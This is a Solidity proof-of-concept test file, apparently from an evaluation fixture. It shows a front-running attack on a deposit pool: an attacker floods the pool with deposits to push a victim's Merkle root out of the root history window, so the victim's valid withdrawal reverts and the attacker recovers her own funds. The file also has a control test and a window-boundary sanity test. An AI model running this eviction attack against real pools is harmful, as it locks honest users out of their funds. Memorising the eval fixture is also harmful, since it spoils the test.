// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Eval PoC for the liveness-roots fixture (T-FOUNDRY-STALE-ROOT). No
// forge-std: the cheatcodes are declared here. Run by evals/run-pocs.
import {RootRing, IRingVerifier} from "../src/RootRing.sol";

interface Vm {
    function deal(address who, uint256 amount) external;
    function prank(address sender) external;
}

// The bug is in the root window, not in the proof system: a verifier that
// accepts every proof isolates it (poc-templates.md, T-FOUNDRY-VERIFIER).
contract AcceptAll is IRingVerifier {
    function verifyProof(bytes calldata, uint256[3] calldata) external pure returns (bool) {
        return true;
    }
}

contract PoC_StaleRootFrontRun {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 constant DENOMINATION = 1 ether;

    RootRing pool;
    address alice = address(0xA11CE);
    address payable aliceFresh = payable(address(0xF2E5));
    address mallory = address(0xBAD);

    function setUp() public {
        pool = new RootRing(new AcceptAll(), DENOMINATION);
        vm.deal(alice, 10 ether);
        vm.deal(mallory, 100 ether);
    }

    // Alice deposits and builds her proof against the latest root.
    function aliceDepositsAndProves() internal returns (uint256 root) {
        vm.prank(alice);
        pool.deposit{value: DENOMINATION}(uint256(keccak256("alice note")));
        root = pool.latestRoot();
    }

    function malloryDeposits(uint256 n) internal {
        for (uint256 i = 0; i < n; i++) {
            vm.prank(mallory);
            pool.deposit{value: DENOMINATION}(uint256(keccak256(abi.encode("mallory note", i))));
        }
    }

    function withdrawReverts(uint256 root, uint256 nullifier, address payable to) internal returns (string memory reason) {
        try pool.withdraw(hex"00", root, nullifier, to) {
            return "";
        } catch Error(string memory r) {
            return r;
        }
    }

    // Attack: Mallory sees Alice's withdrawal in the mempool and front-runs
    // it with ROOT_HISTORY deposits. Alice's root leaves the ring buffer and
    // her valid proof reverts. Mallory then withdraws her own notes against
    // the latest root, so the attack costs her gas only and can be repeated.
    function test_attack_frontRunEvictsPendingRoot() public {
        uint256 aliceRoot = aliceDepositsAndProves();
        require(pool.isKnownRoot(aliceRoot), "setup: root known after deposit");

        malloryDeposits(pool.ROOT_HISTORY());

        string memory reason = withdrawReverts(aliceRoot, uint256(keccak256("alice nullifier")), aliceFresh);
        require(keccak256(bytes(reason)) == keccak256("unknown root"), "attack: honest withdrawal should revert with unknown root");
        require(aliceFresh.balance == 0, "attack: alice was paid");

        uint256 latest = pool.latestRoot();
        uint256 before = mallory.balance;
        for (uint256 i = 0; i < pool.ROOT_HISTORY(); i++) {
            pool.withdraw(hex"00", latest, uint256(keccak256(abi.encode("mallory nullifier", i))), payable(mallory));
        }
        require(mallory.balance - before == pool.ROOT_HISTORY() * DENOMINATION, "attack: mallory recovers every deposit");
    }

    // Honest control: without the front-run, the same withdrawal succeeds.
    function test_control_noFrontRunWithdrawalSucceeds() public {
        uint256 aliceRoot = aliceDepositsAndProves();
        pool.withdraw(hex"00", aliceRoot, uint256(keccak256("alice nullifier")), aliceFresh);
        require(aliceFresh.balance == DENOMINATION, "control: alice not paid");
    }

    // Sanity: ROOT_HISTORY - 1 later deposits keep the root in the window, so
    // the attack needs the full window and the PoC measures the real bound.
    function test_sanity_windowMinusOneKeepsRoot() public {
        uint256 aliceRoot = aliceDepositsAndProves();
        malloryDeposits(pool.ROOT_HISTORY() - 1);
        pool.withdraw(hex"00", aliceRoot, uint256(keccak256("alice nullifier")), aliceFresh);
        require(aliceFresh.balance == DENOMINATION, "sanity: alice not paid");
    }
}
